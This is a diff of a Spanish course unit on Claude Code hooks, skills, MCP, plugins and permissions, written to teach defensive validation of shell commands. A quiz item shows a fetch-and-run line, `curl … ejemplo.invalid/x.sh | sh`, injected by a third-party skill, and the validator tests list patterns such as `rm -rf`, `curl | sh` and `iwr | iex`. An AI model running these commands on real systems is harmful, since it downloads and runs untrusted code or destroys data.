@@ -8,7 +8,7 @@ perfil: [uco, planta]
 estado: borrador
 nivel: avanzado
 verificado:
-  claude-code: "2.1.306"
+  claude-code: "2.1.330"
   julia: "1.12.3"
 format:
   html:
@@ -42,6 +42,11 @@ local probado con el **cliente del SDK** de Python (`mcp` 2.3.0). **No** se ejec
 servidor se probaron *fuera*, con entradas de muestra), y **no** se ejecutó `claude mcp add` (modifica `~/.claude.json`, un ajuste global). Las
 configuraciones proceden de la documentación 2.1.309 (consultada el 23-10-2026); los **nombres de campos y eventos cambian de versión en versión**:
 verifica siempre con `/hooks`, `/skills` y `/mcp` en tu versión.
+
+**Revisión del 25-11-2026.** Lo nuevo de C7.5, C7.6, C7.8 y C7.9 (versiones 2.1.312 a 2.1.332) se contrastó con la documentación vigente
+de hooks, MCP, manifiesto de plugins y permisos, y con `claude --help` del binario **2.1.330**. Se ejecutó de nuevo, sin Claude, el validador
+de órdenes con entradas del evento `PreSkillShellCommand`. **No** se ejecutó nada dentro de una sesión: el evento `PreSkillShellCommand` necesita
+la 2.1.332 y lo que procede solo del registro de cambios se indica como tal.
 
 :::
 
@@ -156,7 +161,7 @@ Una **skill** es una carpeta con un `SKILL.md` (cabecera YAML + instrucciones en
 **Argumentos y recursos:** `$ARGUMENTS` se sustituye por lo que escribas tras el nombre; `${CLAUDE_SKILL_DIR}` es la carpeta de la skill, para llamar a sus *scripts* (que se **ejecutan**, no se cargan en el contexto). La
 documentación recomienda `SKILL.md` de menos de 500 líneas y poner el material extenso en ficheros aparte.
 
-**Seguridad.** Una skill de un repositorio ajeno puede traer `allowed-tools` que concedan permisos sin preguntar, o `` !`orden` `` que ejecuta una orden de shell antes de que Claude vea el texto: **lee las skills de terceros antes de usarlas** y
+**Seguridad.** Una skill de un repositorio ajeno puede traer `allowed-tools` que concedan permisos sin preguntar, o `` !`orden` `` que ejecuta una orden de shell antes de que Claude vea el texto (desde Claude Code 2.1.332 se puede vigilar con un hook, C7.5): **lee las skills de terceros antes de usarlas** y
 usa `disable-model-invocation: true` en las que tengan efectos. Los comandos personalizados antiguos de `.claude/commands/` se han **fusionado con las skills** (siguen funcionando; si hay una skill y un comando con el mismo nombre, gana la skill).
 
 **Probar una skill.** Su parte de código (*scripts*) se prueba como cualquier código (C5): entradas buenas, malas y límite, **sin** Claude. Su parte de instrucciones se prueba **usándola** con casos conocidos y comprobando que no se salta pasos. La skill de abajo
@@ -246,16 +251,39 @@ enviar un mensaje, al terminar un turno (`Stop`), etc. A diferencia de una instr
 
 El *matcher* filtra por nombre de herramienta (`Bash`, `Edit|Write`, `mcp__.*`). Sin matcher, el hook se ejecuta en **cada** aparición del evento.
 
+**El matcher `Bash` también vigila Monitor.** La herramienta Monitor lanza una orden de shell en segundo plano (un `tail -f` de un registro, por ejemplo)
+y le va pasando a Claude lo que imprime. Desde Claude Code 2.1.314, un hook `PreToolUse` o `PermissionRequest` con *matcher* `Bash` (o `Bash|PowerShell`, `Bash.*`)
+se ejecuta también con esas órdenes: puede **bloquearlas** o pedir confirmación, pero un `allow` o una reescritura de la orden no tienen efecto
+[@anthropic-hooks; @anthropic-changelog]. Para aprobar o reescribir órdenes de Monitor hay que nombrarlo en el *matcher* (`Bash|Monitor`) y, si se quiere
+afinar, en la condición `if` (`Monitor(tail *)`). La consecuencia práctica es buena: un validador como el del ejemplo 1 protege también esas órdenes sin tocarlo.
+
 **Cómo hablan Claude Code y el hook.** El hook recibe **un JSON por la entrada estándar** (stdin) con campos comunes (`session_id`, `cwd`, `hook_event_name`) y los del evento; en `PreToolUse` de Bash, `tool_name` y `tool_input.command`. Responde con **código de salida**:
 
 | Código | Significado en `PreToolUse` |
 |---|---|
 | **0** | No decide nada: sigue el flujo normal de permisos. **No aprueba** la orden |
 | **2** | **Bloquea**; lo escrito en `stderr` llega a Claude como explicación para que ajuste |
-| Otro | El hook falló; en la mayoría de eventos la acción continúa (**un hook roto no protege**) |
+| Otro | El hook falló; en la mayoría de eventos la acción continúa (**un hook roto no protege**), salvo que el hook declare `onFailure: "block"` (abajo) |
 
 Alternativa con más control: salir con 0 e imprimir un JSON con `hookSpecificOutput.permissionDecision` (`"deny"`, `"allow"`, `"ask"`) y un motivo. Un `"deny"` de un hook **se mantiene en todos los modos de permisos**, incluso con
 `bypassPermissions`; un `"allow"` **no** salta las reglas `deny`. Elige un enfoque por hook (código **o** JSON).
+
+**Fallar abierto o fallar cerrado: `onFailure`.** Un control de seguridad tiene que decidir qué hace cuando **él mismo** falla. Si deja pasar la acción
+(*fallar abierto*), un script roto equivale a no tener control; si la bloquea (*fallar cerrado*), un script roto detiene el trabajo hasta que lo arreglas. Por
+omisión, los hooks de Claude Code fallan abiertos. El campo `onFailure` de un hook cambia eso: con `"block"`, cualquier fallo del hook (no arranca, sale con un
+código distinto de 0 y 2, se agota su `timeout` o devuelve una salida no válida) cuenta como un código 2 en ese evento; con `"continue"`, o sin el campo, la
+acción sigue. Según la referencia de hooks consultada el 25-11-2026, vale para los hooks de tipo `command` y `http` desde Claude Code 2.1.295 (y para
+`mcp_tool` desde la 2.1.328), y no tiene efecto en `Stop`, `SubagentStop`, dos eventos de los equipos de agentes ni en los hooks asíncronos [@anthropic-hooks]:
+
+```json
+{ "type": "command",
+  "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/validar-comando.sh",
+  "onFailure": "block" }
+```
+
+Úsalo en los hooks que **protegen** (como `validar-comando.sh`), no en los que solo informan. Para comprobarlo, repite el ejercicio 2 («Rompe tu hook») con
+el hook instalado: sin `onFailure`, la orden pasa; con `"block"`, Claude Code la bloquea. El coste es real: si falta `jq` en el equipo, **todas** las órdenes de
+shell quedarán bloqueadas hasta que lo instales. (Comportamiento tomado de la documentación; no se ha ejecutado en una sesión.)
 
 #### Ejemplo 1: validación previa de órdenes
 
@@ -278,6 +306,15 @@ exit 0
 
 (El fichero real añade el caso `curl | sh` con una expresión regular.) Hay una variante **PowerShell** (`validar-comando.ps1`) que lee el JSON con `ConvertFrom-Json` y usa `exit 2` igual. **Resultado comprobado** (ejecutando los scripts con JSON de muestra, sin Claude): `ls` y `git status` → 0; `rm -rf`, push forzado, `reset --hard`, `sudo` y `curl | sh` → **2** con el mensaje; un `git push` normal → 0, porque **ese lo decide el permiso `ask`**, no el hook. En PowerShell 7 (sobre macOS): `rm -rf` → 2, `git status` → 0, `iwr … | iex` → 2.
 
+**Registrar la variante PowerShell.** Un hook de tipo `command` acepta el campo `shell`: `"bash"` (por omisión) o `"powershell"`; en Windows sin Git Bash, el
+valor por omisión pasa a ser PowerShell [@anthropic-hooks]. Por ejemplo,
+`{ "type": "command", "shell": "powershell", "command": "& \"$env:CLAUDE_PROJECT_DIR/.claude/hooks/validar-comando.ps1\"" }`
+(el `&` hace falta: una orden que solo es una cadena entre comillas no ejecuta nada en PowerShell; esta línea no se ha probado en Windows). Dos avisos de versión: en
+Windows sin Git Bash, en `PreToolUse` solo cuentan como veredicto los códigos 0 y 2 (cualquier otro se trata como fallo que bloquea); y hasta la 2.1.315 un hook de
+PowerShell cuya orden **empezaba** por una conversión de tipo (`[int]…`), `param`, `using` o un atributo no bloqueaba con `exit 2`, algo que el registro de cambios
+da por corregido en la 2.1.316 [@anthropic-changelog]. `validar-comando.ps1` no empieza así, pero es un motivo más para comprobar el bloqueo **en tu versión**
+con la orden de prueba de la práctica guiada.
+
 **Un caso real mientras se escribía esta unidad.** El hook de este proyecto (`.claude/hooks/bloquear-datos-privados.sh`, de once líneas) **bloqueó varias veces** órdenes de shell del propio asistente porque su *texto* mencionaba la carpeta protegida,
 aunque solo fuera para escribir un fichero de documentación. Es el comportamiento deseado... y también su **limitación**: un hook por patrones de texto es una segunda barrera, no una defensa completa.
 
@@ -291,26 +328,51 @@ devuelve `{"decision": "block", "reason": "…"}` (la forma de decisión que la 
 
 **Configuración de ambos hooks** (`hooks/settings.ejemplo.json`, validada con `jq`): `PreToolUse` con `Bash` y `PostToolUse` con `Edit|Write`. Los scripts deben ser **ejecutables** en macOS (`chmod +x`).
 
-::: {.callout-note .novedad icon=false title="Novedad · Claude Code 2.1.312 a 2.1.316 · por incorporar"}
-- **Hooks de PowerShell y `exit 2`** (2.1.316): se corrige que un hook de PowerShell **no
-  bloqueara** con el código 2 cuando su orden empieza por una conversión de tipo, `param`, `using`
-  o un atributo [@anthropic-changelog]. `validar-comando.ps1` no empieza así, pero es un motivo
-  más para probar el bloqueo en la versión que uses.
-- **Hooks y la herramienta Monitor** (2.1.314): los hooks con *matcher* `Bash` se ejecutan también
-  con las órdenes de shell que lanza Monitor. Pueden bloquearlas o preguntar, pero no aprobarlas
-  ni reescribirlas. Las condiciones `if` como `Monitor(tail *)` casan como `Bash(tail *)`.
-- **Límite de simultaneidad** (2.1.312): como mucho se ejecutan a la vez 24 hooks de tipo
-  *prompt* o *agent* por sesión, subagentes incluidos. Un `timeout` inferior a 1 segundo cuenta
-  como 1 segundo.
+#### Ejemplo 3: vigilar las órdenes que inyectan las skills
 
-[Leída en el changelog oficial el 03-11-2026; no ejecutada ni integrada aún en el texto, que se
-contrastó con la 2.1.309.]{.novedad-estado}
-:::
+En C7.3 viste que una skill puede llevar `` !`orden` `` (o un bloque ` ```! `): Claude Code ejecuta esa orden de shell **al cargar la skill**, antes de que
+Claude lea el texto, y pone su salida en su lugar. Esas órdenes **no pasan por `PreToolUse`**, así que el validador del ejemplo 1 no las ve. Para cubrir ese
+hueco, Claude Code 2.1.332 añade el evento **`PreSkillShellCommand`**, que se dispara justo antes de cada orden inyectada [@anthropic-hooks; @anthropic-changelog]:
+
+- **Matcher:** la herramienta que ejecutaría la orden, `Bash` o `PowerShell` (`Bash|PowerShell` cubre las dos).
+- **Entrada:** los campos comunes más `tool_name`, `tool_input.command` (la orden tal como se ejecutaría), `command_name` (la skill que se carga),
+  `command_source` (de dónde viene: ajustes de usuario, de proyecto, un plugin…) e `invoked_by` (`"user"`, `"claude"` u otro, como un subagente).
+- **Decisión:** solo puede **bloquear** (código 2, o `permissionDecision: "deny"` en el mismo formato JSON que `PreToolUse`); no puede aprobar ni reescribir.
+  Si bloquea, la skill se carga igualmente y, en lugar de la salida, Claude ve un aviso de orden no ejecutada.
+- **Dónde se declara:** en un fichero de ajustes o en un plugin, con un hook `command`, `http` o `mcp_tool` no asíncrono. Los hooks de la cabecera de la propia
+  skill no sirven para esto, ni los de tipo *prompt* o *agent*.
+
+Como la entrada tiene el mismo `tool_input.command`, **el mismo `validar-comando.sh` sirve sin cambios**:
+
+```json
+{
+  "hooks": {
+    "PreSkillShellCommand": [
+      {
+        "matcher": "Bash|PowerShell",
+        "hooks": [
+          { "type": "command", "command": "\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/validar-comando.sh", "onFailure": "block" }
+        ]
+      }
+    ]
+  }
+}
+```
+
+**Resultado comprobado** (25-11-2026, sin Claude, enviando al script JSON con la forma de este evento): `rm -rf build` → **2** con el mensaje;
+`git log --oneline -5` → 0; `curl … | sh` → **2**. **No comprobado dentro de Claude Code:** el binario de la revisión es la 2.1.330 y, según la documentación,
+antes de la 2.1.332 las órdenes inyectadas se ejecutan sin llamar a este hook (en la 2.1.331, además, el evento desconocido provoca un aviso al arrancar). Para
+comprobarlo en tu versión, crea una skill de prueba cuyo `SKILL.md` contenga `` !`echo rm -rf x` `` (una orden inofensiva que el patrón detecta), invócala y
+comprueba que Claude Code informa de que la orden no se ejecutó. Si tu plugin o tu proyecto dependen de este evento, exige la versión mínima (C7.8).
 
 ::: {.callout-warning title="Riesgos de los hooks"}
 - **Se ejecutan con tus permisos** y sin pedirte confirmación: un hook de un repositorio ajeno puede hacer lo que tú puedes hacer. **Lee los hooks de `.claude/settings.json` de cualquier proyecto antes de aceptar su confianza.**
-- **Un hook que falla suele no bloquear**: si tu script se rompe (código distinto de 0 y 2), la acción sigue. Pruébalo.
-- **No metas lógica lenta**: se ejecuta en cada evento que coincide.
+- **Un hook que falla suele no bloquear**: si tu script se rompe (código distinto de 0 y 2), la acción sigue, salvo con `onFailure: "block"`. Pruébalo.
+- **No metas lógica lenta**: se ejecuta en cada evento que coincide. Además de los de tipo `command`, hay hooks de tipo *prompt* y *agent*, que piden a un modelo
+  que evalúe la situación: son lentos y gastan. Los hooks que coinciden se ejecutan en paralelo y los de esos dos tipos tienen un tope de simultaneidad, sobre el
+  que **las fuentes discrepan**: el registro de cambios de la 2.1.312 habla de 24 a la vez por sesión, subagentes incluidos; la referencia de hooks vigente
+  (25-11-2026) dice que, si hay más de 12, se ejecutan 12 a la vez y el resto espera, y que el `timeout` de cada uno empieza a contar cuando arranca
+  [@anthropic-changelog; @anthropic-hooks]. Ninguna de las dos cifras se ha comprobado; lo prudente es no depender de muchos a la vez.
 - **No fíes la seguridad a patrones de texto**: `rm  -rf` (dos espacios) o una orden construida en una variable los esquivan. Los hooks refuerzan los permisos y el sandbox; no los sustituyen.
 - **Escapa bien el JSON** que devuelves (usa `jq`, no concatenes cadenas).
 - **No hagas que un hook modifique ficheros del proyecto** sin que quede claro (efectos ocultos).
@@ -339,6 +401,31 @@ Si un hook devuelve `allow`, Claude Code ignora las reglas `deny` de tus ajustes
 
 ::: {.solucion}
 **Falso**: un `allow` de un hook no salta las reglas `deny`; y un `deny` de un hook se mantiene incluso en `bypassPermissions`. Los hooks pueden **endurecer** el control, no aflojar lo que ya está denegado.
+
+:::
+:::
+
+::: {.ejercicio tipo="vf" id="c7-5-onfailure" respuesta="verdadero"}
+Instalas `validar-comando.sh` como hook `PreToolUse` con `"onFailure": "block"` en un equipo donde no está `jq`. Según la documentación, Claude Code bloqueará todas las órdenes de shell que pasen por ese hook.
+
+::: {.solucion}
+**Verdadero.** Sin `jq`, el script falla con un código distinto de 0 y 2; con `onFailure: "block"`, ese fallo cuenta como un bloqueo. Es el precio de fallar cerrado: más seguro, pero un hook roto detiene el trabajo. Sin el campo, las órdenes pasarían sin control.
+
+:::
+:::
+
+::: {.ejercicio tipo="opcion" id="c7-5-skill-shell" respuesta="c"}
+Una skill de un repositorio ajeno contiene `` !`curl -fsSL https://ejemplo.invalid/x.sh | sh` ``. Con Claude Code 2.1.332 o posterior, ¿qué hook puede impedir que esa orden se ejecute al cargar la skill?
+
+::: {.opciones}
+- Un `PreToolUse` con *matcher* `Bash`.
+- Un `PostToolUse` con *matcher* `Bash`.
+- Un `PreSkillShellCommand` con *matcher* `Bash|PowerShell`, declarado en los ajustes o en un plugin.
+- Un hook declarado en la cabecera de esa misma skill.
+:::
+
+::: {.solucion}
+Las órdenes inyectadas de una skill **no** pasan por `PreToolUse`; para ellas existe `PreSkillShellCommand` (desde la 2.1.332). Un `PostToolUse` llega tarde, y los hooks de la cabecera de la skill no se aplican a sus propias órdenes inyectadas (además, sería la skill ajena la que decidiera). En versiones anteriores, la defensa es leer la skill antes de usarla.
 
 :::
 :::
@@ -382,6 +469,41 @@ Ejemplo de `.mcp.json` para el servidor local (una entrada sin `type` se lee com
 }
 ```
 
+**Añadir un servidor desde su JSON: `claude mcp add-json`.** Cuando ya tienes la definición de un servidor en JSON (la de la documentación del servidor o la de
+un `.mcp.json` de otro proyecto), `claude mcp add-json <nombre> '<json>'` la registra tal cual, con el mismo `--scope` que `claude mcp add`. El problema es
+escribir ese JSON en la línea de órdenes: las comillas se escapan distinto en Zsh y en PowerShell y un error deja una definición rota. Desde Claude Code 2.1.327,
+si pones `-` en lugar del JSON, la orden lo lee de la **entrada estándar** [@anthropic-mcp; @anthropic-changelog]. Guarda en `servidor.json` lo que va dentro de
+`"datos-curso"` en el ejemplo anterior y ejecuta, **fuera** de una sesión de Claude Code:
+
+::: {.panel-tabset}
+## macOS (Zsh)
+
+```zsh
+cat servidor.json | claude mcp add-json --scope local datos-curso -
+claude mcp get datos-curso      # comprobación: muestra la orden y los argumentos
+```
+
+## Windows (PowerShell)
+
+```powershell
+Get-Content servidor.json -Raw | claude mcp add-json --scope local datos-curso -
+claude mcp get datos-curso
+```
+:::
+
+La ayuda de `claude mcp add-json --help` del binario 2.1.330 ya recoge el `-` para leer de la entrada estándar; la orden **no se ha ejecutado** por la misma razón que `claude mcp add`
+(escribe en `~/.claude.json`). Si `claude mcp get` muestra `uv` y los cinco argumentos, el JSON llegó entero.
+
+**Trabajos largos: tareas MCP.** Algunas herramientas tardan minutos (exportar un informe, lanzar una compilación). Con la extensión de **tareas MCP**
+(*MCP tasks*), el servidor acepta el trabajo y lo ejecuta **por su cuenta**: la llamada de Claude vuelve en cuanto el servidor lo acepta y Claude puede seguir con
+otra cosa. Claude Code consulta periódicamente el estado, muestra en el pie un contador («1 MCP task») y, al terminar, añade una línea en la conversación y
+entrega el resultado a Claude [@anthropic-mcp]. Cómo se usa: no hay nada que activar; depende de que el **servidor** las ofrezca. Cómo se comprueba: `/tasks`
+lista las tareas en curso y permite pararlas (selección y `x`). Límites documentados: pararla solo **pide** al servidor que cancele (puede terminarla igualmente);
+no funcionan en ejecuciones `claude -p "…"` de una sola vez; y con un servidor *stdio* el proceso termina al cerrar Claude Code, mientras que uno remoto sigue
+trabajando. Sobre la versión, las fuentes no coinciden: la documentación vigente pide Claude Code 2.1.304 o posterior (y un servidor con la revisión del protocolo
+de 28-7-2026), mientras que el registro de cambios las recoge en la 2.1.319; usa la 2.1.319 o posterior para no depender de esa diferencia. El servidor del curso
+(C7.7) responde al instante y **no** usa tareas; no se han probado.
+
 ::: {.callout-warning title="Seguridad de MCP"}
 - **Un servidor MCP es código que se ejecuta en tu máquina** (stdio) o un servicio que recibe lo que Claude le envía (HTTP). Conecta solo servidores en los que **confíes**; la documentación lo advierte expresamente.
 - **Inyección de instrucciones** (*prompt injection*): un servidor que trae contenido externo (páginas web, correos, incidencias) puede incluir texto que *parezca* una instrucción. Claude puede seguirla. Limita lo que cada servidor puede hacer (solo lectura cuando baste) y no le des herramientas que escriban o envíen sin supervisión.
@@ -403,6 +525,15 @@ Quieres que todo tu equipo use el mismo servidor MCP al clonar el repositorio. �
 
 ::: {.solucion}
 El ámbito `project` escribe `.mcp.json` en la raíz, que se commitea. Cada persona tendrá que **aprobarlo** la primera vez. `local` y `user` no se comparten por Git.
+
+:::
+:::
+
+::: {.ejercicio tipo="vf" id="c7-6-tareas" respuesta="falso"}
+Si paras una tarea MCP desde `/tasks`, tienes la garantía de que el servidor no completa el trabajo.
+
+::: {.solucion}
+**Falso.** Parar una tarea solo **pide** al servidor que la cancele; según la documentación, el servidor puede terminarla igualmente. Si el trabajo tiene efectos (enviar, publicar, borrar), compruébalo en el sistema de destino, no en la conversación.
 
 :::
 :::
@@ -470,7 +601,71 @@ Un **plugin** empaqueta skills, hooks, subagentes y servidores MCP en una unidad
 
 **Cuándo empaquetar:** cuando un **segundo repositorio** necesita la misma configuración. Mientras sirvas a un proyecto, `.claude/` (skills, agentes, hooks) y `.mcp.json` versionados bastan.
 
-**Riesgo:** instalar un plugin de terceros es instalar **hooks, skills y servidores** que se ejecutan con tus permisos. Aplica lo de C7.3, C7.5 y C7.6: léelo antes, confía solo en fuentes conocidas y fija versiones. *Esta sección se basa solo en la página de visión general de la extensibilidad; la de plugins no se ha leído completa.*
+**Estructura mínima** (referencia del manifiesto consultada el 25-11-2026 [@anthropic-plugins]). Cada componente va en su carpeta por omisión, en la raíz del
+plugin; el manifiesto `.claude-plugin/plugin.json` es opcional y su único campo obligatorio es `name` (en minúsculas y con guiones, sin empezar por `claude-` ni
+`anthropic-`, que están reservados):
+
+```text
+validar-datos/                 un plugin que reúne la skill y el hook de esta unidad
+├── .claude-plugin/
+│   └── plugin.json            manifiesto: nombre, versión, descripción, engines
+├── skills/
+│   └── validar-tabla/SKILL.md
+├── hooks/
+│   └── hooks.json             la misma forma que el bloque "hooks" de settings.json
+└── scripts/
+    └── validar-comando.sh     lo llama hooks.json con "${CLAUDE_PLUGIN_ROOT}"/scripts/…
+```
+
+**Declarar con qué versiones funciona: `engines`.** Un plugin depende de la versión de Claude Code: si su `hooks.json` usa `PreSkillShellCommand`, en una
+versión anterior a la 2.1.332 ese hook no protege nada. Desde Claude Code 2.1.323, el manifiesto admite `engines` con un rango de versiones al estilo de
+*semver* bajo la clave `claude-code` [@anthropic-plugins; @anthropic-changelog]:
+
+```json
+{
+  "name": "validar-datos",
+  "version": "0.1.0",
+  "description": "Valida tablas de datos y bloquea órdenes de shell de riesgo",
+  "engines": { "claude-code": ">=2.1.332" }
+}
+```
+
+`version` es la versión **del plugin**; `engines`, la de **Claude Code** que necesita. Un matiz de compatibilidad que da la referencia: las versiones 2.0.15 a 2.1.75
+rechazan el manifiesto entero si lleva `engines`, de modo que un plugin que deba funcionar en ellas no puede usar el campo. La referencia consultada no detalla qué
+hace exactamente Claude Code cuando la versión instalada queda fuera del rango; compruébalo en la pestaña de errores de `/plugin`.
+
+**Comprobar el manifiesto: `claude plugin validate`.** Antes de compartir un plugin, valídalo desde la terminal:
+
+```bash
+claude plugin validate ./validar-datos            # «Validation passed», «… with warnings» o «Validation failed»
+claude plugin validate --strict ./validar-datos   # los avisos también hacen fallar (código 1): útil en integración continua
+```
+
+Detecta, entre otras cosas, tipos de campo erróneos, rutas que no existen o que salen de la carpeta del plugin (`..`), campos desconocidos (aviso: Claude Code los
+descarta al cargar), nombres reservados y entradas de servidores MCP que no se cargarían [@anthropic-plugins]. Para probarlo **sin instalarlo**, arranca una sesión
+con `claude --plugin-dir ./validar-datos`, que lo carga solo para esa sesión. Las órdenes `plugin validate` (con `--strict` y `--json`) y `--plugin-dir` figuran en
+`claude --help` del binario 2.1.330; la validación de un plugin de prueba **no** llegó a ejecutarse en la revisión (el entorno de trabajo no lo permitió), así que
+los mensajes citados proceden de la documentación.
+
+**Riesgo:** instalar un plugin de terceros es instalar **hooks, skills y servidores** que se ejecutan con tus permisos. Aplica lo de C7.3, C7.5 y C7.6: léelo antes, confía solo en fuentes conocidas y fija versiones. Que `claude plugin validate` pase solo dice que el manifiesto **se carga**, no que el plugin sea seguro.
+
+**Pon a prueba lo anterior.**
+
+::: {.ejercicio tipo="opcion" id="c7-8-engines" respuesta="b"}
+El `hooks.json` de tu plugin usa el evento `PreSkillShellCommand`, que existe desde Claude Code 2.1.332. ¿Cómo lo declaras en `plugin.json`?
+
+::: {.opciones}
+- `"version": "2.1.332"`
+- `"engines": { "claude-code": ">=2.1.332" }`
+- No hace falta: Claude Code ignora los eventos que no conoce sin avisar.
+- `"name": "claude-code-2.1.332"`
+:::
+
+::: {.solucion}
+`engines` declara las versiones de **Claude Code** con las que funciona el plugin; `version` es la versión del propio plugin. Un evento que tu versión no conoce no protege nada (según la documentación, antes de la 2.1.332 las órdenes inyectadas se ejecutan sin llamar al hook), y un nombre que empieza por `claude-` está reservado. Valida después el manifiesto con `claude plugin validate`.
+
+:::
+:::
 
 ### C7.9 Permisos y seguridad de la configuración {#c7-9}
 
@@ -480,7 +675,7 @@ Todo lo anterior son **maneras de ampliar** lo que Claude Code puede hacer. Ante
 
 1. **Sandbox y aislamiento** (contenedores, máquinas virtuales): limitan el daño real. En Windows nativo el sandbox de Claude Code no está disponible (se necesita WSL 2).
 2. **Reglas `deny`** de permisos: bloquean sin preguntar.
-3. **Hooks `PreToolUse`**: refuerzo determinista, por patrones.
+3. **Hooks `PreToolUse`** (y `PreSkillShellCommand` para las órdenes que inyectan las skills): refuerzo determinista, por patrones.
 4. **Reglas `ask`** y revisión humana del diff.
 5. **`CLAUDE.md`, skills**: instrucciones que se suelen cumplir; **no** son una garantía.
 
@@ -489,6 +684,10 @@ Todo lo anterior son **maneras de ampliar** lo que Claude Code puede hacer. Ante
 - **Nada de secretos** en ficheros versionados (`settings.json`, `.mcp.json`, `CLAUDE.md`): usa variables de entorno, `.local.json` (no versionado) o el almacén del sistema.
 - **Mínimo privilegio:** `allowed-tools` y reglas `allow` lo más estrechas posible; sin comodines amplios.
 - **Revisa lo que viene de fuera** antes de aceptar la confianza de una carpeta: `.claude/settings.json`, hooks, skills y `.mcp.json` de un repositorio ajeno se ejecutan con tus permisos.
+  El propio diálogo de confianza ayuda a hacerlo: según la documentación de permisos, enumera las reglas `allow` y las carpetas adicionales que el proyecto
+  concedería [@anthropic-permisos], y según el registro de cambios, desde Claude Code 2.1.329 indica además **dónde se declaran los hooks** de la carpeta
+  [@anthropic-changelog] (esto último no se ha comprobado). Úsalo como **índice** de lo que tienes que abrir y leer, no como revisión: el diálogo dice dónde están
+  los hooks, no lo que hacen. Y recuerda que `claude -p` no muestra este diálogo (C8.1).
 - **Versiona** la configuración del proyecto y haz que pase **revisión** como el código.
 - **Comprueba** lo configurado: `/permissions`, `/hooks`, `/skills`, `/mcp`, `/status`.
 
@@ -562,6 +761,7 @@ en la documentación actual y qué órdenes peligrosas **no** detectará tu patr
 - Ejecuta tú el script de prueba **sin** Claude Code: ¿todos los casos dan el código esperado?
 - Compara los nombres de campos (`tool_input.command`, `matcher`, `hooks`) con `/hooks` y con la documentación vigente.
 - ¿Admite que un patrón de texto se puede esquivar (`rm  -rf`, variables)? ¿Qué propone para reforzarlo?
+- ¿Qué pasa si el script falla (por ejemplo, falta `jq`)? ¿Propone `onFailure` y explica qué se gana y qué se pierde al fallar cerrado?
 - ¿Mezcla Bash con PowerShell? Comprueba que la variante de tu sistema no usa `jq` ni `[[ ]]` si eres de Windows.
 :::
 
@@ -597,12 +797,20 @@ en la documentación actual y qué órdenes peligrosas **no** detectará tu patr
 
    :::
 
+6. **Empaqueta.** Reúne en un plugin `validar-datos` la skill `validar-tabla` y el hook `validar-comando.sh` (registrado en `PreToolUse` y, si tu versión es la 2.1.332 o posterior, en `PreSkillShellCommand`). Escribe su `plugin.json` con `engines` y pásalo por `claude plugin validate --strict`. Después, introduce un error a propósito (una ruta con `..` o un campo con un tipo equivocado) y comprueba que la validación falla.
+
+   ::: {.callout-note collapse="true" title="Solución"}
+   Estructura de C7.8; en `hooks/hooks.json`, la orden apunta a `"${CLAUDE_PLUGIN_ROOT}"/scripts/validar-comando.sh` (no a `$CLAUDE_PROJECT_DIR`, porque el script viaja con el plugin). `engines` debe pedir la versión mínima de lo que uses (`>=2.1.332` si declaras `PreSkillShellCommand`). Con `--strict`, un aviso (por ejemplo, falta `description`) ya da código 1. Prueba el resultado con `claude --plugin-dir ./validar-datos` y `/hooks` antes de instalarlo.
+
+   :::
+
 ## La doy por superada si…
 
 - Elijo entre `CLAUDE.md`, skill, hook, subagente y MCP sin atribuir a uno lo que hace otro.
 - Escribo una skill con descripción útil, argumentos y *scripts* con pruebas, y sé qué riesgo tiene `allowed-tools`.
 - Escribo un hook de validación previa y otro de comprobación, y los **pruebo sin Claude** con JSON de muestra.
-- Sé que solo el código 2 (o un `deny`) bloquea y que un hook roto no protege.
+- Sé que solo el código 2 (o un `deny`) bloquea, que un hook roto no protege salvo con `onFailure: "block"`, y que las órdenes inyectadas de una skill necesitan `PreSkillShellCommand`.
+- Empaqueto un plugin con `engines` y lo compruebo con `claude plugin validate` antes de compartirlo.
 - Defino un subagente con herramientas limitadas.
 - Conecto un servidor MCP en el ámbito adecuado y conozco sus riesgos (confianza e inyección).
 - Escribo un servidor MCP de solo lectura con validación de entradas.
@@ -614,3 +822,6 @@ en la documentación actual y qué órdenes peligrosas **no** detectará tu patr
 Documentación oficial de Claude Code (versión 2.1.309, consultada el 23-10-2026): [extender Claude Code](https://code.claude.com/docs/en/features-overview),
 [hooks](https://code.claude.com/docs/en/hooks-guide), [skills](https://code.claude.com/docs/en/skills),
 [subagentes](https://code.claude.com/docs/en/sub-agents) y [MCP](https://code.claude.com/docs/en/mcp).
+En la revisión del 25-11-2026 (novedades de 2.1.312 a 2.1.332) se consultaron además la [referencia de hooks](https://code.claude.com/docs/en/hooks),
+la [referencia del manifiesto de plugins](https://code.claude.com/docs/en/plugins-reference), la de [permisos](https://code.claude.com/docs/en/permissions)
+y el [registro de cambios](https://code.claude.com/docs/en/changelog).
